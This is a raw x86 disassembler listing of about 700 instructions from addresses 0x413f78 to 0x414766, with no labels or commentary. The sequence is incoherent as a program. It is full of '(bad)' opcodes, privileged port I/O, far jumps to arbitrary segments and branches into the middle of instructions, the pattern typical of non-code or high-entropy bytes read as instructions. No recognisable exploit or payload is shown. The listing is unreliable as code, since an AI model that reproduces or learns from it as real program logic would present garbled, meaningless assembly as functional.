  413f78:	(bad)  
  413f79:	fcom   QWORD PTR [eax+0xa]
  413f7c:	leave  
  413f7d:	pop    ebp
  413f7e:	sbb    dl,BYTE PTR [esi+0x39]
  413f81:	cdq    
  413f82:	and    ch,BYTE PTR [ecx+0x1a080553]
  413f88:	mov    eax,ds:0xd7bdd9fe
  413f8d:	sbb    eax,0xc15f91b6
  413f92:	stos   BYTE PTR es:[edi],al
  413f93:	mov    ds:0x9be0e9b,eax
  413f98:	jg     0x413fdd
  413f9a:	loope  0x413ffb
  413f9c:	mov    esi,0x60bbc151
  413fa1:	in     eax,dx
  413fa2:	xlat   BYTE PTR ds:[ebx]
  413fa3:	ins    DWORD PTR es:[edi],dx
  413fa4:	inc    edi
  413fa5:	pop    eax
  413fa6:	lock xor al,0xfa
  413fa9:	jg     0x413faa
  413fab:	lds    esi,FWORD PTR [edx+eax*2+0x77]
  413faf:	hlt    
  413fb0:	xor    cl,BYTE PTR [edx]
  413fb2:	loop   0x413ff8
  413fb4:	push   0xcff82910
  413fb9:	adc    al,0x97
  413fbb:	mov    esi,0xde251760
  413fc0:	sub    cl,ch
  413fc2:	inc    ecx
  413fc3:	add    BYTE PTR [edi+0x2accadda],al
  413fc9:	int3   
  413fca:	inc    esi
  413fcb:	push   esp
  413fcc:	retf   0xd20
  413fcf:	iret   
  413fd0:	mov    al,0xa6
  413fd2:	je     0x41403e
  413fd4:	fisttp WORD PTR [ebx+0x53]
  413fd7:	out    dx,al
  413fd8:	shl    esi,1
  413fda:	xor    BYTE PTR [ebx-0x5e22439f],ah
  413fe0:	bnd je 0x414016
  413fe3:	mov    ch,0xde
  413fe5:	jns    0x414028
  413fe7:	lea    edx,[eax+0x74]
  413fea:	jnp    0x413fb4
  413fec:	repnz (bad) [esi-0x4b]
  413ff0:	inc    edi
  413ff1:	push   0x3930303b
  413ff6:	inc    DWORD PTR [ebx-0x52603486]
  413ffc:	hlt    
  413ffd:	mov    ch,0x4c
  413fff:	mov    eax,DWORD PTR [ebx-0x35112069]
  414005:	out    dx,eax
  414006:	call   0x72ab:0x9feb9c2b
  41400d:	mov    ds:0xd6fbf3d,eax
  414012:	jmp    FWORD PTR [ebx+eiz*1]
  414015:	test   BYTE PTR [esi-0x34],al
  414018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414019:	push   0xe6f245bb
  41401e:	dec    esi
  41401f:	outs   dx,BYTE PTR ds:[esi]
  414020:	rol    DWORD PTR [eax],cl
  414022:	xlat   BYTE PTR ds:[ebx]
  414023:	sub    BYTE PTR [eax],dl
  414025:	cwde   
  414026:	sar    BYTE PTR [edi-0x3f],1
  414029:	test   eax,0x155109c5
  41402e:	adc    DWORD PTR [ebp-0x19],ebp
  414031:	mov    DWORD PTR [esi],ebp
  414033:	inc    ebx
  414034:	cwde   
  414035:	call   DWORD PTR ds:0xf2d7e84a
  41403b:	retf   0x5855
  41403e:	inc    ebp
  41403f:	cmp    dh,BYTE PTR [eax]
  414041:	loopne 0x414012
  414043:	stos   DWORD PTR es:[edi],eax
  414044:	pusha  
  414045:	retf   
  414046:	mov    dl,0xa9
  414048:	pop    eax
  414049:	inc    ebx
  41404a:	icebp  
  41404b:	cmp    DWORD PTR [eax+0x5e1a241d],edi
  414051:	jl     0x41406f
  414053:	lea    edx,[esi]
  414055:	aas    
  414056:	and    eax,0x45e4074f
  41405b:	push   es
  41405c:	inc    edi
  41405d:	or     ah,bl
  41405f:	jg     0x41406a
  414061:	jp     0x4140cf
  414063:	outs   dx,BYTE PTR ds:[esi]
  414064:	bound  edi,QWORD PTR [eax+0x5794d524]
  41406a:	pop    ds
  41406b:	repnz cdq 
  41406d:	out    dx,al
  41406e:	push   ds
  41406f:	adc    DWORD PTR [edi],ecx
  414071:	mov    edx,?
  414073:	je     0x41407e
  414075:	lahf   
  414076:	fbld   TBYTE PTR [ebx]
  414078:	loope  0x41408d
  41407a:	pop    esp
  41407b:	mov    edi,esi
  41407d:	mov    edx,0x90b6f59f
  414082:	in     al,0x26
  414084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414085:	dec    ebp
  414086:	xor    esi,DWORD PTR [eax]
  414088:	fwait
  414089:	pop    edi
  41408a:	test   BYTE PTR [eax-0x1],bh
  41408d:	ss jbe 0x4140f9
  414090:	and    eax,DWORD PTR [ebp+0x67]
  414093:	sar    DWORD PTR [eax+0x33],0x1
  414097:	retf   
  414098:	push   ss
  414099:	inc    ebp
  41409a:	nop
  41409b:	popf   
  41409c:	and    eax,0xa9e5abf7
  4140a1:	sbb    eax,0x52337d63
  4140a6:	ror    DWORD PTR [edx-0x36449cfd],1
  4140ac:	into   
  4140ad:	lods   eax,DWORD PTR ds:[esi]
  4140ae:	and    eax,esp
  4140b0:	in     eax,0x5a
  4140b2:	mov    cl,cl
  4140b4:	sub    BYTE PTR [edx+esi*8+0x6a9ddc38],0x5c
  4140bc:	fsub   st,st(2)
  4140be:	adc    eax,0xd49c3c9e
  4140c3:	arpl   ax,bp
  4140c5:	cwde   
  4140c6:	and    bh,ah
  4140c8:	xlat   BYTE PTR ds:[ebx]
  4140c9:	push   ds
  4140ca:	fwait
  4140cb:	xor    al,0x78
  4140cd:	dec    ebx
  4140ce:	ss fcmovb st,st(1)
  4140d1:	push   edx
  4140d2:	lock mov cl,0x75
  4140d5:	data16 lahf 
  4140d7:	in     al,dx
  4140d8:	or     ch,BYTE PTR [ebp+edx*2-0x4669ca96]
  4140df:	dec    eax
  4140e0:	mov    edi,eax
  4140e2:	daa    
  4140e3:	ins    DWORD PTR es:[edi],dx
  4140e4:	dec    ebx
  4140e5:	pushf  
  4140e6:	rcr    BYTE PTR [eax-0x4f6fffe0],1
  4140ec:	mov    ah,0xe7
  4140ee:	inc    ecx
  4140ef:	sub    BYTE PTR [esi+0x476f5c5b],cl
  4140f5:	inc    edx
  4140f6:	dec    edx
  4140f7:	mov    ah,0x96
  4140f9:	lock and eax,0x68a198ad
  4140ff:	out    0x43,eax
  414101:	shr    DWORD PTR ds:0x6d6029dd,0x70
  414108:	push   eax
  414109:	dec    edi
  41410a:	(bad)  
  41410b:	int    0xdb
  41410d:	stos   BYTE PTR es:[edi],al
  41410e:	cmp    eax,0x2acfdc4a
  414113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414114:	pop    ds
  414115:	fisub  DWORD PTR [eax+edx*1-0xc]
  414119:	stos   BYTE PTR es:[edi],al
  41411a:	das    
  41411b:	or     al,BYTE PTR [ebx+0x1]
  41411e:	and    eax,0xb9b6e2b2
  414123:	jno    0x414133
  414125:	sbb    dh,BYTE PTR [edx]
  414127:	(bad)  
  414128:	dec    esi
  414129:	xchg   BYTE PTR [edx+0x7a],dh
  41412c:	mov    gs,WORD PTR ds:0xd2edbf75
  414132:	bswap  ebx
  414134:	xchg   cl,bh
  414136:	in     eax,dx
  414137:	or     DWORD PTR [edi],ebp
  414139:	call   DWORD PTR [ecx]
  41413b:	das    
  41413c:	test   BYTE PTR [ecx+0x161dbbb4],bl
  414142:	adc    al,0x80
  414144:	repz mov dl,0xb7
  414147:	retf   0xc90a
  41414a:	xor    DWORD PTR [ebp+0x5f65a013],esp
  414150:	aam    0x61
  414152:	adc    BYTE PTR [ebp-0x4c],bl
  414155:	jmp    0x633f:0xe34a5622
  41415c:	pop    es
  41415d:	xlat   BYTE PTR ds:[ebx]
  41415e:	iret   
  41415f:	sbb    edx,DWORD PTR [edx]
  414161:	mov    al,0x3c
  414163:	sbb    cl,BYTE PTR [edi+0x34]
  414166:	pop    ecx
  414167:	xchg   esp,eax
  414168:	mov    al,ds:0xa0b8b391
  41416d:	or     al,0x35
  41416f:	mov    bl,0x3d
  414171:	dec    eax
  414172:	jmp    DWORD PTR [edx-0x2a03609]
  414178:	(bad)  
  414179:	jge    0x41412a
  41417b:	xchg   BYTE PTR [edx],dl
  41417d:	es ja  0x4141b3
  414180:	(bad)  
  414181:	pop    edi
  414182:	jb     0x41419f
  414184:	int    0xa6
  414186:	dec    eax
  414187:	pushf  
  414188:	(bad)  
  41418b:	add    al,0xc7
  41418d:	in     eax,dx
  41418e:	pop    esi
  41418f:	xor    cl,BYTE PTR [ecx]
  414191:	cwde   
  414192:	(bad)  
  414195:	enter  0x3954,0xea
  414199:	out    0x89,al
  41419b:	shl    DWORD PTR ds:0x8a6d2d08,1
  4141a1:	inc    ebx
  4141a2:	push   ds
  4141a3:	xchg   esp,eax
  4141a4:	or     esi,esp
  4141a6:	inc    edx
  4141a7:	pop    eax
  4141a8:	mov    edx,0xe5c608df
  4141ad:	fiadd  WORD PTR [edx+0x6e]
  4141b0:	lahf   
  4141b1:	push   eax
  4141b2:	inc    ebx
  4141b3:	sub    edi,ebp
  4141b5:	jge    0x41422d
  4141b7:	mov    eax,0xbebd367a
  4141bc:	sbb    ch,cl
  4141be:	adc    BYTE PTR [ebx],dh
  4141c0:	adc    ecx,ecx
  4141c2:	jmp    0x8272:0x24fa4c90
  4141c9:	inc    ecx
  4141ca:	and    esp,ebp
  4141cc:	popf   
  4141cd:	and    DWORD PTR fs:[esi+0x34],ebx
  4141d1:	leave  
  4141d2:	rep lods eax,DWORD PTR ds:[esi]
  4141d4:	int3   
  4141d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141d6:	dec    ecx
  4141d7:	mov    ds:0x7fb45ae3,eax
  4141dc:	out    dx,eax
  4141dd:	(bad)  
  4141de:	pop    eax
  4141df:	leave  
  4141e0:	pop    edx
  4141e1:	mov    al,ds:0x38f77f09
  4141e6:	dec    edi
  4141e7:	mov    al,0x8c
  4141e9:	sbb    DWORD PTR [ebp-0x2d3b3d59],ebp
  4141ef:	xor    bh,BYTE PTR [ecx+ebp*4-0x63]
  4141f3:	lods   eax,DWORD PTR ds:[esi]
  4141f4:	rol    BYTE PTR [eax-0x7e],0x2e
  4141f8:	leave  
  4141f9:	stos   DWORD PTR es:[edi],eax
  4141fa:	clc    
  4141fb:	push   edi
  4141fc:	adc    ebx,DWORD PTR [edi-0x5b7b6a49]
  414202:	call   0xe85d:0xe801ba32
  414209:	jle    0x414202
  41420b:	cld    
  41420c:	sbb    BYTE PTR [ebx+0x4],bl
  41420f:	or     DWORD PTR [ebp-0x44],edx
  414212:	push   edi
  414213:	scas   eax,DWORD PTR es:[edi]
  414214:	jo     0x414244
  414216:	call   0xd7a755a9
  41421b:	dec    eax
  41421c:	sub    DWORD PTR [ebx-0x59],ebx
  41421f:	fs or  al,0xf5
  414222:	fsubr  DWORD PTR [edi+ecx*8]
  414225:	dec    edx
  414226:	sbb    al,0xe8
  414228:	add    ah,BYTE PTR [ebx+edi*8-0x34c63608]
  41422f:	sbb    al,BYTE PTR [edx]
  414231:	mov    edi,0xe9b1bfff
  414236:	(bad)  
  414238:	ss iret 
  41423a:	std    
  41423b:	ins    BYTE PTR es:[edi],dx
  41423c:	in     eax,0xab
  41423e:	add    ch,BYTE PTR [eax]
  414240:	mov    bh,0xe6
  414242:	adc    al,0xd
  414244:	std    
  414245:	js     0x41427c
  414247:	jbe    0x4142b9
  414249:	or     eax,0x974b820c
  41424f:	cld    
  414250:	dec    esi
  414251:	adc    eax,0x330b3f18
  414256:	je     0x41423b
  414258:	jne    0x41423d
  41425a:	mov    dl,0x36
  41425c:	retf   0x3c82
  41425f:	and    dh,bl
  414261:	daa    
  414262:	xchg   ebp,eax
  414263:	shl    dl,1
  414265:	push   edx
  414266:	inc    edx
  414267:	sub    DWORD PTR [ecx-0x47],0xffffffc3
  41426b:	mov    fs,WORD PTR [ecx]
  41426d:	inc    ebp
  41426e:	jmp    0xbf77cc90
  414273:	shl    dl,1
  414275:	push   ds
  414276:	xor    ebx,ecx
  414278:	out    0xf7,eax
  41427a:	push   ebp
  41427b:	pop    edx
  41427c:	xchg   ebx,eax
  41427d:	mov    BYTE PTR [eax],al
  41427f:	in     eax,dx
  414280:	mov    WORD PTR [edi],ds
  414282:	adc    al,0x5f
  414284:	test   al,0x14
  414286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414287:	int    0xb3
  414289:	into   
  41428a:	sub    BYTE PTR [ebp+0x4668813b],bl
  414290:	imul   ebx,DWORD PTR [ebx+0x5dded52a],0xa4f7afd2
  41429a:	xchg   DWORD PTR [esi],esp
  41429c:	sbb    BYTE PTR [ebx-0x5501474f],dl
  4142a2:	push   cs
  4142a3:	into   
  4142a4:	imul   edx,DWORD PTR [ecx+0x7],0x0
  4142a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142aa:	pop    es
  4142ab:	push   ecx
  4142ac:	mov    es,WORD PTR [ecx+0x3193d16b]
  4142b2:	ja     0x41423a
  4142b4:	pop    eax
  4142b5:	jae    0x414322
  4142b7:	add    BYTE PTR [eax+0x76],ah
  4142ba:	jge    0x4142fb
  4142bc:	jp     0x41429a
  4142be:	push   cs
  4142bf:	pop    ss
  4142c0:	mov    ds:0x4a38c42d,eax
  4142c5:	add    BYTE PTR [esi-0x5bdc5c68],cl
  4142cb:	aaa    
  4142cc:	add    eax,0x9bdfcff4
  4142d1:	add    eax,0x7c7fb3ff
  4142d6:	xor    ebx,DWORD PTR [ecx]
  4142d8:	add    edi,DWORD PTR cs:[eax+ebp*1-0x55]
  4142dd:	lds    esi,FWORD PTR [ebx]
  4142df:	aaa    
  4142e0:	std    
  4142e1:	fstp   DWORD PTR [ecx-0x17]
  4142e4:	push   es
  4142e5:	mov    ebp,0x7737af9e
  4142ea:	sbb    ebx,ebx
  4142ec:	in     eax,dx
  4142ed:	ja     0x4142a5
  4142ef:	cmp    ch,BYTE PTR [esi]
  4142f1:	and    ah,BYTE PTR [edi+0x38]
  4142f4:	enter  0x2fc6,0xb7
  4142f8:	test   eax,0x2bd431d
  4142fd:	mov    bh,0x70
  4142ff:	jecxz  0x4142e3
  414301:	ret    0x494d
  414304:	ds pop ss
  414306:	je     0x4142d3
  414308:	dec    edx
  414309:	and    al,0x4c
  41430b:	mov    dl,0xbd
  41430d:	out    dx,al
  41430e:	or     DWORD PTR [ebx],0xcc3d18a0
  414314:	adc    eax,0xa70e5ca5
  414319:	lahf   
  41431a:	into   
  41431b:	(bad)  
  41431c:	pop    edx
  41431d:	cdq    
  41431e:	mov    esp,0x825553c3
  414323:	repz icebp 
  414325:	pop    edi
  414326:	ds or  al,0x49
  41432a:	fidiv  DWORD PTR [edx]
  41432c:	sbb    BYTE PTR [eax],cl
  41432e:	and    al,0xb3
  414330:	sub    bh,bh
  414332:	inc    ecx
  414333:	mov    eax,ds:0x23b21c28
  414338:	pop    ecx
  414339:	out    0x20,eax
  41433b:	mov    ch,BYTE PTR ds:0xf4c24273
  414341:	jge    0x4142f2
  414343:	shl    BYTE PTR [ebx],cl
  414345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414346:	aas    
  414347:	into   
  414348:	rcl    DWORD PTR ds:0xf082dda1,1
  41434e:	dec    esp
  41434f:	jo     0x414313
  414351:	pop    esi
  414352:	push   esi
  414353:	xchg   ebp,eax
  414354:	out    0x83,eax
  414356:	out    dx,al
  414357:	sar    BYTE PTR [edx-0x60],1
  41435a:	or     eax,ebx
  41435c:	push   0xffffff8a
  41435e:	ror    DWORD PTR [ebx+0x6f657c5b],1
  414364:	int3   
  414365:	lods   al,BYTE PTR ds:[esi]
  414366:	and    eax,0x39c8a477
  41436b:	xor    edi,DWORD PTR [ebp+0x23715a56]
  414371:	enter  0xc5fa,0xcf
  414375:	pop    esi
  414376:	js     0x414327
  414378:	stos   BYTE PTR es:[edi],al
  414379:	aas    
  41437a:	and    eax,0x78765d78
  41437f:	fstp   DWORD PTR [eax]
  414381:	xor    al,0x36
  414383:	je     0x4143bd
  414385:	inc    esi
  414386:	mov    esi,0x33371536
  41438b:	pop    ebp
  41438c:	fcomp  st(4)
  41438e:	popf   
  41438f:	push   0x6879354d
  414394:	leave  
  414395:	(bad)  
  414397:	fstp   DWORD PTR [ecx+0x61]
  41439a:	add    BYTE PTR [eax+0x74],0xda
  41439e:	lods   al,BYTE PTR ds:[esi]
  41439f:	popa   
  4143a0:	je     0x41439d
  4143a2:	loope  0x41433b
  4143a4:	rol    bh,1
  4143a6:	add    al,0xd0
  4143a8:	jne    0x4143b1
  4143aa:	xor    esi,edx
  4143ac:	add    al,0x70
  4143ae:	xchg   DWORD PTR [ebp+0xb831867],esp
  4143b4:	int3   
  4143b5:	ss loop 0x4143c7
  4143b8:	je     0x4143e4
  4143ba:	xchg   edi,eax
  4143bb:	inc    esi
  4143bc:	sbb    BYTE PTR [edi-0x48],ch
  4143bf:	push   ebx
  4143c0:	push   0x866c992f
  4143c5:	jg     0x41436b
  4143c7:	jno    0x4143ef
  4143c9:	cdq    
  4143ca:	mov    bh,0x15
  4143cc:	js     0x4143b2
  4143ce:	cmp    DWORD PTR [ebp+0x28e13401],0x1e
  4143d5:	das    
  4143d6:	dec    esi
  4143d7:	cmp    al,0x71
  4143d9:	mov    DWORD PTR [eax+esi*4-0x77],esi
  4143dd:	adc    ecx,esi
  4143df:	hlt    
  4143e0:	rol    BYTE PTR [ebx+0x388f3d01],1
  4143e6:	lock outs dx,DWORD PTR ds:[esi]
  4143e8:	adc    BYTE PTR [ecx+0xf179e7e],ch
  4143ee:	mov    esp,0xcd4f9f88
  4143f3:	lock stc 
  4143f5:	fisttp QWORD PTR [edi+0x2ead974d]
  4143fb:	jb     0x4143c8
  4143fd:	jge    0x414478
  4143ff:	xlat   BYTE PTR ds:[ebx]
  414400:	es int3 
  414402:	xchg   ebx,eax
  414403:	test   BYTE PTR [ebx+0x43c5c21c],cl
  414409:	sahf   
  41440a:	aaa    
  41440b:	mov    dh,0xcc
  41440d:	dec    edx
  41440e:	jge    0x4143cf
  414410:	in     eax,0x81
  414412:	add    al,0x2c
  414414:	aaa    
  414415:	loopne 0x41441d
  414417:	ret    0xb9a
  41441a:	pop    ds
  41441b:	mov    ecx,0x544bd645
  414420:	push   eax
  414421:	shr    ebp,cl
  414423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414424:	out    0x67,al
  414426:	and    eax,0xacee31e1
  41442b:	ins    DWORD PTR es:[edi],dx
  41442c:	mov    edi,0xbd03b87d
  414431:	pcmpgtd mm1,mm6
  414434:	xchg   edi,eax
  414435:	(bad)  
  414436:	jns    0x4144a2
  414438:	test   DWORD PTR [ecx+eax*1],edi
  41443b:	fcmovnbe st,st(3)
  41443d:	xchg   ebx,eax
  41443e:	xchg   ecx,eax
  41443f:	ficomp DWORD PTR [ebx]
  414441:	push   0x9fcca
  414446:	jmp    0x414404
  414448:	imul   edi,DWORD PTR [ebx-0x57],0xb7067fbe
  41444f:	cmp    DWORD PTR [eax+0x4e],esi
  414452:	mov    ah,0x42
  414454:	mov    BYTE PTR [ecx+0x3a681654],ch
  41445a:	xchg   edi,eax
  41445b:	pop    edi
  41445c:	test   BYTE PTR [ecx],al
  41445e:	lea    edx,ds:0xa1ee5b3c
  414464:	(bad)  
  414465:	mov    eax,ds:0x218ac51f
  41446a:	(bad)  
  41446b:	or     al,0xa3
  41446d:	cmp    al,0xd1
  41446f:	fcomp  DWORD PTR ds:0x8412c9c8
  414475:	xchg   edi,eax
  414476:	(bad)  
  414477:	not    DWORD PTR [edx-0x62]
  41447a:	(bad)  
  41447b:	jmp    0xcf2183d2
  414480:	(bad)  
  414481:	adc    esi,DWORD PTR [edx-0x30]
  414484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414485:	repz (bad)
  414488:	arpl   sp,sp
  41448a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41448b:	repz gs sbb al,0x25
  41448f:	add    esi,DWORD PTR [edi+eiz*2+0x2219af4f]
  414496:	cmp    eax,0xb80cd604
  41449b:	sub    edx,DWORD PTR [edi]
  41449d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41449e:	loope  0x41442f
  4144a0:	out    dx,al
  4144a1:	adc    eax,0xbb749bc5
  4144a6:	mov    ebx,gs
  4144a8:	jbe    0x41450c
  4144aa:	cmp    bl,BYTE PTR [ecx]
  4144ac:	jne    0x414460
  4144ae:	(bad)  
  4144b0:	icebp  
  4144b1:	loopne 0x4144a2
  4144b3:	lods   al,BYTE PTR ss:[esi]
  4144b5:	test   BYTE PTR [ecx],ch
  4144b7:	mov    BYTE PTR [eax+0x38fc27c],cl
  4144bd:	aad    0xac
  4144bf:	push   es
  4144c0:	stos   DWORD PTR es:[edi],eax
  4144c1:	jp     0x4144f3
  4144c3:	mov    al,0x1a
  4144c5:	xchg   edi,eax
  4144c6:	push   0xffffffae
  4144c8:	lea    edx,[ecx+eax*2]
  4144cb:	js     0x414531
  4144cd:	rol    DWORD PTR [edx-0x25f915ba],cl
  4144d3:	xor    eax,0x65db69c8
  4144d8:	in     al,dx
  4144d9:	jbe    0x4144fb
  4144db:	int    0x1e
  4144dd:	mov    edx,DWORD PTR [ebp-0x4833ac5e]
  4144e3:	and    al,0x3c
  4144e5:	inc    eax
  4144e6:	inc    edx
  4144e7:	lods   eax,DWORD PTR ds:[esi]
  4144e8:	mov    ebp,es
  4144ea:	xchg   edi,eax
  4144eb:	mov    BYTE PTR [edx-0x35b22fed],ah
  4144f1:	scas   al,BYTE PTR es:[edi]
  4144f2:	lea    eax,[ecx]
  4144f4:	sub    dl,BYTE PTR [edi-0x36]
  4144f7:	and    ah,BYTE PTR [edi+edx*2]
  4144fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144fb:	sub    ebp,DWORD PTR [edx]
  4144fd:	addr16 mov ds:0x3fc,al
  414501:	sahf   
  414502:	int    0xc9
  414504:	push   eax
  414505:	cwde   
  414506:	test   BYTE PTR ds:0xe2cf622f,ch
  41450c:	inc    edx
  41450d:	pop    edx
  41450e:	pop    ebx
  41450f:	pusha  
  414510:	mov    esi,0x98be796c
  414515:	cmp    eax,0xfb42abe2
  41451a:	mov    edx,DWORD PTR [esi+0x46]
  41451d:	(bad)  
  41451f:	in     eax,dx
  414520:	adc    eax,ebx
  414522:	push   0xc2e5edd0
  414527:	jl     0x4144f1
  414529:	xlat   BYTE PTR ds:[ebx]
  41452a:	std    
  41452b:	div    DWORD PTR [edi]
  41452d:	add    ebx,DWORD PTR [ebp+0x7]
  414530:	mov    al,0x16
  414532:	in     eax,0x7c
  414534:	inc    ebp
  414535:	dec    ecx
  414536:	cmp    eax,0x9cde153d
  41453b:	mov    ebp,0x7055d9dd
  414540:	push   cs
  414541:	mov    BYTE PTR ds:0xe1ea3192,dh
  414547:	aas    
  414548:	fwait
  414549:	loop   0x4145ba
  41454b:	or     al,0x9f
  41454d:	call   0x5f5c:0xbd02b037
  414554:	mov    edi,0x6e5775b8
  414559:	cmc    
  41455a:	shl    BYTE PTR [edi],1
  41455c:	(bad)  [ebp-0x7a1ca3f6]
  414562:	add    DWORD PTR [ebx+0x55f6f236],ecx
  414568:	xchg   ebx,eax
  414569:	cmp    DWORD PTR [edx],0xffffffb8
  41456c:	int    0xf
  41456e:	sbb    edi,esp
  414570:	inc    esp
  414571:	pop    ebp
  414572:	add    BYTE PTR [edi],dl
  414574:	mov    dh,0x2e
  414576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414577:	mov    ds,WORD PTR [edx-0x73b9e371]
  41457d:	scas   al,BYTE PTR es:[edi]
  41457e:	int3   
  41457f:	es jmp 0xf239283b
  414585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414586:	repnz sar BYTE PTR [edx+0x74],cl
  41458a:	fs inc esp
  41458c:	repnz neg BYTE PTR [edi+0x1b628da3]
  414593:	xor    ah,BYTE PTR [eax]
  414595:	push   cs
  414596:	inc    esi
  414597:	push   esp
  414598:	pop    esi
  414599:	add    DWORD PTR [eax+0x6d3de46d],esp
  41459f:	cmp    eax,0xdf803f7b
  4145a4:	adc    al,0x1
  4145a6:	jo     0x4145bf
  4145a8:	xor    BYTE PTR [edi],ah
  4145aa:	jbe    0x41455b
  4145ac:	test   ah,al
  4145ae:	test   DWORD PTR [ebx],0x678ba481
  4145b4:	lods   al,BYTE PTR ds:[esi]
  4145b5:	or     eax,0xc7724dfc
  4145ba:	stos   BYTE PTR es:[edi],al
  4145bb:	jle    0x414554
  4145bd:	inc    esp
  4145be:	rol    DWORD PTR [esi-0x7b7324c8],0xd9
  4145c5:	pop    esi
  4145c6:	std    
  4145c7:	or     al,0xa7
  4145c9:	sub    ah,BYTE PTR [eax-0x71d8d806]
  4145cf:	mov    ecx,0xf9706b31
  4145d4:	shl    BYTE PTR [ebp+0x1c467aef],1
  4145da:	cmp    ebx,eax
  4145dc:	jb     0x4145f0
  4145de:	add    DWORD PTR [ebx+0x43d234f7],esi
  4145e4:	clc    
  4145e5:	inc    esi
  4145e6:	lds    edx,FWORD PTR [ebx-0x3f95748a]
  4145ec:	cld    
  4145ed:	(bad)  
  4145ee:	mov    ecx,0xbafc4194
  4145f3:	fiadd  DWORD PTR [ecx+0x5feab876]
  4145f9:	lds    edi,FWORD PTR [esi-0x707ead54]
  4145ff:	test   eax,0x7210fbbd
  414604:	mov    ds:0x7f4021a3,eax
  414609:	sub    ch,BYTE PTR [edx]
  41460b:	(bad)  
  41460c:	cmp    DWORD PTR [esi-0x7b],edi
  41460f:	pop    ebx
  414610:	fsubr  QWORD PTR [esi]
  414612:	adc    DWORD PTR [eax+0x5b429f8f],ecx
  414618:	add    DWORD PTR [ecx+0x1f495042],ebx
  41461e:	gs iret 
  414620:	repnz mov ebp,0x37c779f4
  414626:	inc    eax
  414627:	test   BYTE PTR [edx-0x258a4c8f],al
  41462d:	xchg   esp,eax
  41462e:	mov    ds:0xd3fc93d2,eax
  414633:	cwde   
  414634:	jnp    0x4146a7
  414636:	mov    esp,0xf1105654
  41463b:	das    
  41463c:	fxch   st(1)
  41463e:	call   FWORD PTR [ebp+0x1f]
  414641:	(bad)  
  414642:	fidiv  DWORD PTR [ecx-0x5065270]
  414648:	fcom   QWORD PTR [ecx-0x523e6473]
  41464e:	(bad)  
  41464f:	xchg   edi,eax
  414650:	jp     0x4146b1
  414652:	xor    ebx,DWORD PTR [edi+0x1b8aca54]
  414658:	xrelease mov DWORD PTR ss:[ebx+0x2334b4df],edx
  414660:	inc    esp
  414661:	cmp    eax,0x62fbcf9f
  414666:	xor    DWORD PTR [ebx+ebp*2+0x62fcecd0],ebp
  41466d:	xchg   ecx,eax
  41466e:	jg     0x414685
  414670:	fwait
  414671:	cmp    BYTE PTR [edi+edx*8+0x5ecaafe8],bh
  414678:	out    dx,eax
  414679:	cmp    BYTE PTR [esi-0x6a4e2799],al
  41467f:	sti    
  414680:	mov    ecx,0xe9394291
  414685:	retf   0xb454
  414688:	jbe    0x41460f
  41468a:	xor    cl,BYTE PTR [ebx]
  41468c:	inc    esi
  41468d:	enter  0x1946,0x95
  414691:	adc    eax,0xf8050ec7
  414696:	jmp    0x2d9f9c3e
  41469b:	(bad)  
  41469c:	iret   
  41469d:	gs lahf 
  41469f:	jmp    ebx
  4146a1:	jmp    0x66e6:0x7426da4
  4146a8:	jns    0x4146ef
  4146aa:	and    eax,0x29d46c25
  4146af:	in     eax,dx
  4146b0:	or     eax,0x50fb60a0
  4146b5:	push   0x757ac337
  4146ba:	or     ah,bh
  4146bc:	sbb    al,0xb7
  4146be:	xor    esi,ebp
  4146c0:	jge    0x4146ad
  4146c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146c3:	cld    
  4146c4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4146c6:	jae    0x414697
  4146c8:	popa   
  4146c9:	jbe    0x41467a
  4146cb:	out    dx,eax
  4146cc:	sub    ebx,DWORD PTR [edi+edx*2]
  4146cf:	repnz mov al,ds:0xf86e0142
  4146d5:	in     al,0xec
  4146d7:	dec    ebp
  4146d8:	hlt    
  4146d9:	(bad)  
  4146da:	mov    ebx,0x45b46bca
  4146df:	pop    ss
  4146e0:	(bad)  
  4146e1:	dec    esp
  4146e2:	sbb    eax,0x97226613
  4146e7:	adc    DWORD PTR [esi+0x49],esp
  4146ea:	jp     0x41467a
  4146ec:	fnsave [edx+0xfb484cc]
  4146f2:	adc    al,0x13
  4146f4:	pop    es
  4146f5:	daa    
  4146f6:	mov    al,ds:0x7d40d87
  4146fb:	sub    ah,dl
  4146fd:	push   ebx
  4146fe:	shl    BYTE PTR [ebx-0xfcfd326],0x99
  414705:	pop    ds
  414706:	lea    edx,[edi]
  414708:	cwde   
  414709:	call   0x46e16340
  41470e:	push   esp
  41470f:	es ins BYTE PTR es:[edi],dx
  414711:	add    bh,bh
  414713:	mov    edx,0x388273f5
  414718:	sbb    eax,0xaacfbb03
  41471d:	adc    eax,0x443f9351
  414722:	xchg   esi,eax
  414723:	(bad)  
  414724:	(bad)  
  414725:	jnp    0x414793
  414727:	ins    DWORD PTR es:[edi],dx
  414728:	mov    ecx,0x6c77ba91
  41472d:	sbb    DWORD PTR [edx+0x50],edx
  414730:	mov    edi,0x36c8229a
  414735:	and    eax,0xc3670f48
  41473a:	sub    BYTE PTR [ebp+0x7],cl
  41473d:	mov    edi,0xb1c19ed8
  414742:	push   esp
  414743:	and    ah,BYTE PTR [edi+0x667680cf]
  414749:	aas    
  41474a:	push   ecx
  41474b:	in     al,0x2e
  41474d:	pop    esi
  41474e:	rcr    BYTE PTR [ecx+0x4b],0x47
  414752:	sar    DWORD PTR [edx+0x3721248c],1
  414758:	sub    BYTE PTR [ecx-0x58fa1fcc],0xf6
  41475f:	sbb    al,0xa9
  414761:	int    0xd9
  414763:	es adc dl,bl
  414766:	into   
